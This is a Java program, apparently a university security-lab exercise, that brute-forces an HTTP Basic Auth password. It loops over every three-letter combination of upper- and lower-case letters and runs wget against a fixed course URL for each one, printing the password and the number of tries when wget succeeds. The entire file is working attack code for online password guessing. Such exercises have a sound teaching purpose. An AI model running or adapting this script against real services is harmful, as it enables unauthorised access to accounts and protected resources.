import java.io.IOException;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
public class BruteForce {
    public static void main ( final String[] array ) {
        final String s = "http://sec-crack.cs.rmit.edu./SEC/2/";
        final String s2 = new String ( "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" );
        int n = 0;
        for ( int length = s2.length(), i = 0; i < length; ++i ) {
            for ( int j = 0; j < length; ++j ) {
                for ( int k = 0; k < length; ++k ) {
                    try {
                        final String string = String.valueOf ( s2.charAt ( i ) ) + String.valueOf ( s2.charAt ( j ) ) + String.valueOf ( s2.charAt ( k ) );
                        System.out.print ( s2.charAt ( i ) );
                        System.out.print ( s2.charAt ( j ) );
                        System.out.println ( s2.charAt ( k ) );
                        final Process exec = Runtime.getRuntime().exec ( "wget --http-user= --http-passwd=" + string + " " + s );
                        final BufferedReader bufferedReader = new BufferedReader ( new InputStreamReader ( exec.getInputStream() ) );
                        final BufferedReader bufferedReader2 = new BufferedReader ( new InputStreamReader ( exec.getErrorStream() ) );
                        String line;
                        while ( ( line = bufferedReader.readLine() ) != null ) {
                            System.out.println ( line );
                        }
                        String line2;
                        while ( ( line2 = bufferedReader2.readLine() ) != null ) {
                            System.out.println ( line2 );
                        }
                        try {
                            exec.waitFor();
                        } catch ( InterruptedException ex2 ) {}
                        ++n;
                        if ( exec.exitValue() == 0 ) {
                            System.out.println ( "**********PASSWORD IS: " + string );
                            System.out.println ( "**********NUMBER OF TRIES: " + n );
                            System.exit ( 1 );
                        }
                    } catch ( IOException ex ) {
                        System.out.println ( "exception happened - here's what I know: " );
                        ex.printStackTrace();
                        System.exit ( -1 );
                    }
                }
            }
        }
    }
}
